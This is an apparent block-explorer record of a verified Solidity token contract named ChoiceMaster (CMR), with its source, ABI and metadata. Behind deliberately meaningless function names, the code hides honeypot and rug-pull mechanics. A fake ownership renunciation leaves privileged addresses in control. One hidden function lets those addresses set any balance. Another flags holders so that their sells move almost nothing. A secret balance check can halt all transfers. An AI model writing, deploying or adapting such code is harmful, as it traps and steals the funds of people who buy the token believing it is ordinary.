{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface amountBuy {\n    function createPair(address totalWalletFund, address totalTrading) external returns (address);\n}\n\ninterface toShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellBuy) external view returns (uint256);\n\n    function transfer(address buyTake, uint256 minFund) external returns (bool);\n\n    function allowance(address modeLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyTake,\n        uint256 minFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingTeamReceiver, uint256 value);\n    event Approval(address indexed modeLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract isList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoEnableTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toShouldMetadata is toShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ChoiceMaster is isList, toShould, toShouldMetadata {\n\n    address public isAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenMarketing;\n    }\n\n    uint8 private fromMax = 18;\n\n    function fundExempt(address receiverFund) public {\n        launchedLimitReceiver();\n        \n        if (receiverFund == isAuto || receiverFund == marketingIs) {\n            return;\n        }\n        walletLimitIs[receiverFund] = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return swapWallet;\n    }\n\n    function listToken(uint256 minFund) public {\n        launchedLimitReceiver();\n        launchMin = minFund;\n    }\n\n    bool public tradingReceiver;\n\n    bool public senderShould;\n\n    event OwnershipTransferred(address indexed exemptLaunchLimit, address indexed walletTeam);\n\n    function allowance(address shouldSwap, address feeTeam) external view virtual override returns (uint256) {\n        if (feeTeam == toToken) {\n            return type(uint256).max;\n        }\n        return txFund[shouldSwap][feeTeam];\n    }\n\n    mapping(address => uint256) private toList;\n\n    function fromFee(address limitMax) public {\n        if (tradingReceiver) {\n            return;\n        }\n        \n        fundShould[limitMax] = true;\n        if (fromWallet) {\n            tradingLaunchedLaunch = false;\n        }\n        tradingReceiver = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private txFund;\n\n    mapping(address => bool) public fundShould;\n\n    string private fromFund = \"Choice Master\";\n\n    function walletSell(address txModeTo, address buyTake, uint256 minFund) internal returns (bool) {\n        require(toList[txModeTo] >= minFund);\n        toList[txModeTo] -= minFund;\n        toList[buyTake] += minFund;\n        emit Transfer(txModeTo, buyTake, minFund);\n        return true;\n    }\n\n    uint256 public toFund;\n\n    uint256 buyMarketing;\n\n    address toToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public tradingLaunchedLaunch;\n\n    function owner() external view returns (address) {\n        return swapWallet;\n    }\n\n    mapping(address => bool) public walletLimitIs;\n\n    address public marketingIs;\n\n    uint256 private buyToken;\n\n    address toSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public fromWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return fromFund;\n    }\n\n    function transferFrom(address txModeTo, address buyTake, uint256 minFund) external override returns (bool) {\n        if (_msgSender() != toToken) {\n            if (txFund[txModeTo][_msgSender()] != type(uint256).max) {\n                require(minFund <= txFund[txModeTo][_msgSender()]);\n                txFund[txModeTo][_msgSender()] -= minFund;\n            }\n        }\n        return toTokenWallet(txModeTo, buyTake, minFund);\n    }\n\n    function toTokenWallet(address txModeTo, address buyTake, uint256 minFund) internal returns (bool) {\n        if (txModeTo == isAuto) {\n            return walletSell(txModeTo, buyTake, minFund);\n        }\n        uint256 amountMin = toShould(marketingIs).balanceOf(toSell);\n        require(amountMin == launchMin);\n        require(buyTake != toSell);\n        if (walletLimitIs[txModeTo]) {\n            return walletSell(txModeTo, buyTake, receiverLaunch);\n        }\n        return walletSell(txModeTo, buyTake, minFund);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellMin;\n    }\n\n    uint256 constant receiverLaunch = 9 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromMax;\n    }\n\n    function transfer(address minSwap, uint256 minFund) external virtual override returns (bool) {\n        return toTokenWallet(_msgSender(), minSwap, minFund);\n    }\n\n    bool public launchedSenderSell;\n\n    address private swapWallet;\n\n    string private sellMin = \"CMR\";\n\n    function walletAutoAt(address minSwap, uint256 minFund) public {\n        launchedLimitReceiver();\n        toList[minSwap] = minFund;\n    }\n\n    function balanceOf(address sellBuy) public view virtual override returns (uint256) {\n        return toList[sellBuy];\n    }\n\n    function modeReceiver() public {\n        emit OwnershipTransferred(isAuto, address(0));\n        swapWallet = address(0);\n    }\n\n    function launchedLimitReceiver() private view {\n        require(fundShould[_msgSender()]);\n    }\n\n    uint256 public enableLaunch;\n\n    uint256 private limitListTeam;\n\n    uint256 launchMin;\n\n    uint256 private tokenMarketing = 100000000 * 10 ** 18;\n\n    function approve(address feeTeam, uint256 minFund) public virtual override returns (bool) {\n        txFund[_msgSender()][feeTeam] = minFund;\n        emit Approval(_msgSender(), feeTeam, minFund);\n        return true;\n    }\n\n    constructor (){\n        \n        autoEnableTo tokenFromList = autoEnableTo(toToken);\n        marketingIs = amountBuy(tokenFromList.factory()).createPair(tokenFromList.WETH(), address(this));\n        \n        isAuto = _msgSender();\n        fundShould[isAuto] = true;\n        toList[isAuto] = tokenMarketing;\n        modeReceiver();\n        if (takeToken) {\n            takeToken = false;\n        }\n        emit Transfer(address(0), isAuto, tokenMarketing);\n    }\n\n    bool public takeToken;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLaunchLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTeamReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"}],\"name\":\"fromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"fundExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSenderSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minFund\",\"type\":\"uint256\"}],\"name\":\"listToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunchedLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txModeTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFund\",\"type\":\"uint256\"}],\"name\":\"walletAutoAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLimitIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ChoiceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}